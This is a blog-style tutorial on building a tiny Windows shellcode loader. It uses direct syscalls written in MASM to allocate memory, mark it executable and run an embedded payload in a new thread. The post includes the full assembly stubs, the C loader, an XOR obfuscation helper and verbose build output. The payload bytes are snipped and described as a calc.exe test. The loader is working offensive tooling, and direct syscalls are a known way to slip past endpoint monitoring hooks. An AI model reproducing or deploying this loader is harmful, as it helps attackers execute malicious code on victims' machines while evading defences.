---
title:  "Creating tiny 3.50 KB windows shellcode loaders, Its not about the size but how you use it: syscalled"
categories: Windows
classes: wide
---

Writing very very simple and tiny shellcode loaders using MASM assembly for the fun of it.  


1. Create a new Cpp project and create 3 files, syscall.asm and syscall.c, syscall.h

The project needs to be configured.
Setup phnt header include directory for Solution->ProjectName.

Project->Build Customisation-> masm(.targets, .props) = check box Y


2. Win32 & CRT-less time :)

- project properties linker->input->Ignore All default libraries  =   yes. 
	link library dependencies = no
	Additional Dependencies = add the private ntdllp ;ntdllp.lib or add #pragma comment(lib, "ntdllp.lib") 
	if you have sdk & wdk
	
- linker->Advanced->Entry Point                                   =   ThisIsNotAnEntryPoint (can be custom name)
	linker-> all options -> Show Progress -> Display all progress messages 
	Linker-> Debugging -> Generate Debug Info = No
	
- c++->Code Generation->Basic Runtime Check                       =   default (to avoid linking in __RTC_*. 
- C/C++ -> all options -> security = Disable Security Check (/GS-)
- project properties MASM -> public symbols (Yes (/Zf)) (Can enable this or just specify PUBLIC 
	FuncNameHere at top of asm 
	object file name -> $(SolutionDir)\Bin\%(FileName).obj
	
- project properties MASM -> Advanced -> Calling conv = C-Style /Gd /Gd
	error reporting = do not send

3. create syscall.asm (Get your syscall numbers and target to system)

{% highlight assembly %}
PUBLIC AlloeVirtMem
PUBLIC WriVirMem
PUBLIC ProtVirtMem
PUBLIC CreThreE
PUBLIC WaiSinObj

_DATA SEGMENT
_DATA ENDS

_TEXT SEGMENT

AlloeVirtMem PROC
	mov r10, rcx
	mov eax, 18h
	syscall
	ret
AlloeVirtMem ENDP

WriVirMem PROC
	mov r10, rcx
	mov eax, 3Ah
	syscall
	ret
WriVirMem ENDP

ProtVirtMem PROC
	mov r10, rcx
	mov eax, 50h
	syscall
	ret
ProtVirtMem ENDP

CreThreE PROC
	mov r10, rcx
	mov eax, 0C1h
	syscall
	ret
CreThreE ENDP


WaiSinObj PROC
	mov r10, rcx
	mov eax, 4h
	syscall
	ret
WaiSinObj ENDP


_TEXT ENDS
END
{% endhighlight %}

## syscall.c
{% highlight c %}
/*
Micro Manual MASM based Self Thread Shellcode Injection Using Syscalls
Date	:	29/10/2021
*/

#include "syscall.h"

void ThisIsNotAnEntryPoint(void)
{
	DbgPrint("Custom Entrypoint ThisIsNotAnEntryPoint calc.exe no encryption\n");
		
	unsigned char pload[] = { 0xfc,0x48,0x83,[...SNIP...],0x00 };
	size_t pload_size = sizeof(pload);
	
	HANDLE ph = NtCurrentProcess();
	void * ba = NULL;
	NTSTATUS SysAllocateReturn = AlloeVirtMem(ph, &ba, 0, &pload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DbgPrint("SysAllocateReturn\t%x\n", SysAllocateReturn);

	my_memmove(ba, (void*)pload, 276);
	DbgPrint("ba 0x%p", ba);      
		
	ULONG nprt = PAGE_EXECUTE_READ;
	ULONG oprt = 0;
	NTSTATUS SysNtProtectReturn = ProtVirtMem(ph, &ba, &pload_size, nprt, &oprt);
	DbgPrint("SysNtProtectReturn\t%x\n", SysNtProtectReturn);
	
	HANDLE th = NULL;
	NTSTATUS SysNtCreateReturn = CreThreE(&th, GENERIC_EXECUTE, NULL, ph, ba, NULL, FALSE, 0, 0, 0, NULL);
	DbgPrint("SysNtCreateReturn\t%x\n", SysNtCreateReturn);
	
	WaiSinObj(th, FALSE, NULL);
	DbgPrint("END");
}

{% endhighlight %}

## syscall.h
{% highlight c %}
#pragma once
#define WIN32_LEAN_AND_MEAN
#pragma check_stack(off)

#include "phnt/phnt_windows.h"
#include "phnt/phnt.h"

// this is taken straight from sektor7 RTO-MDE , nice lil xor routine
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	// for the bytes in the data
	for (int i = 0; i < data_len; i++)
	{
		// Iterate over every character in the key 
		// and "encrypt" XOR a byte with that "key" character
		if (j == key_len - 1) j = 0;
		// xor the data at the iteration index with the key index e.g. data[1] ^ data[1] until key len is reached and 
		// will be repeated
		data[i] = data[i] ^ key[j];
		j++;
	}
}

#define BUFFER_SIZE        4096

// taken straight from https://aticleworld.com/memmove-function-implementation-in-c/
void* my_memmove(void* dest, const void* src, unsigned int n)
{
	char* pDest = (char*)dest;
	const char* pSrc = (const char*)src;
	////allocate memory for tmp array
	//char* tmp = (char*)malloc(sizeof(char) * n);

	char* tmp[BUFFER_SIZE];

	if (NULL == tmp)
	{
		return NULL;
	}
	else
	{
		unsigned int i = 0;
		// copy src to tmp array
		for (i = 0; i < n; ++i)
		{
			*(tmp + i) = *(pSrc + i);
		}
		//copy tmp to dest
		for (i = 0; i < n; ++i)
		{
			*(pDest + i) = *(tmp + i);
		}

		//free(tmp); //free allocated memory
		// not going to free lol
	}
	return dest;
}
{% endhighlight %}

Now due to verbosity of the build, we can see what happens during the build. I dont really understand why some compiler flags clash but thats the MSVC compiler for you.

```
Rebuild started...
1>------ Rebuild All started: Project: Syscall, Configuration: Release x64 ------
1>Assembling syscall.asm...
1>MASM : warning A4018: invalid command-line option : /Gd
1>cl : command line warning D9025: overriding '/sdl' with '/GS-'
1>syscall.c
1>Processed /NODEFAULTLIB (suppressing all default libs)
1>Starting pass 1
1>Searching libraries
[...SNIP...]
1>      Found __imp_DbgPrint
1>        Referenced in syscall.obj
1>        Loaded ntdllp.lib(ntdll.dll)
1>      Found __IMPORT_DESCRIPTOR_ntdll
1>        Referenced in ntdllp.lib(ntdll.dll)
1>        Loaded ntdllp.lib(ntdll.dll)
1>      Found __NULL_IMPORT_DESCRIPTOR
1>        Referenced in ntdllp.lib(ntdll.dll)
1>        Loaded ntdllp.lib(ntdll.dll)
1>      Found ntdll_NULL_THUNK_DATA
1>        Referenced in ntdllp.lib(ntdll.dll)
1>        Loaded ntdllp.lib(ntdll.dll)
1>Finished searching libraries
1>Finished pass 1
1>Generating code
1>Previous IPDB not found, fall back to full compilation.
1>All 2 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
1>Finished generating code
1>Searching libraries
[...SNIP...]
1>      Found __chkstk
1>        Referenced in syscall.obj
1>        Loaded ntdllp.lib(ntdll.dll)
1>Finished searching libraries
1>Invoking rc.exe:
1> /v
1> /x
1> /fo
1> "C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
1> "C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
1>Microsoft (R) Windows (R) Resource Compiler Version 10
1>
1>Copyright (C) Microsoft Corporation.  All rights reserved.
1>
1>
1>Using codepage 1252 as default
1>Creating C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}}.tmp
1>
1>
1>C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp.
1>Writing 24:1,	lang:0x409,	size 381
1>Invoking cvtres.exe:
1> /machine:amd64
1> /verbose
1> /out:"C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
1> /readonly
1> "C:\Users\ShortUsername\AppData\Local\Temp\lnk{GUID}.tmp"
1>Microsoft (R) Windows Resource To Object Converter Version 14
1>Copyright (C) Microsoft Corporation.  All rights reserved.
1>
1>adding resource. type:MANIFEST, name:1, language:0x0409, flags:0x30, size:381
1>Unused libraries:
[...SNIP...]
1>Processing /ORDER options
1>    External code objects not listed in the /ORDER file:
1>        __chkstk		; ntdllp.lib(ntdll.dll)
1>        __imp_DbgPrint		; ntdllp.lib(ntdll.dll)
1>        DbgPrint		; ntdllp.lib(ntdll.dll)
1>        __imp___chkstk		; ntdllp.lib(ntdll.dll)
1>        ??_C@_0DG@NADDNNLH@Custom?5Entrypoint?5ThisIsNotAnEn@		; syscall.obj
1>Finished processing /ORDER options
1>    Discarded DbgPrint from ntdllp.lib(ntdll.dll)
1>Starting pass 2
1>     * CIL library *(* CIL module *)
1>     * linker generated manifest res *
1>     syscall.obj
1>     ntdllp.lib(ntdll.dll)
1>     ntdllp.lib(ntdll.dll)
1>     ntdllp.lib(ntdll.dll)
1>     ntdllp.lib(ntdll.dll)
1>     ntdllp.lib(ntdll.dll)
1>Finished pass 2
1>Syscall.vcxproj -> D:\Collections\Projects\Syscall\Syscall\x64\Release\Syscall.exe
1>Done building project "Syscall.vcxproj".
========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
``` 

Now you will have a tiny binary which doesnt depend on win32 or crt. 
```
DRIVE:\Project\Projects\Syscall\Syscall>ls -lah DRIVE:\Project\Projects\Syscall\Syscall\x64\Release\Syscall.exe
-rwxr-xr-x 1 p4yl0_q36yakq 197610 4.0K Month 99 99:99 'DRIVE:\Project\Syscall\x64\Release\Syscall.exe'
```

Its not about the size but how you use it.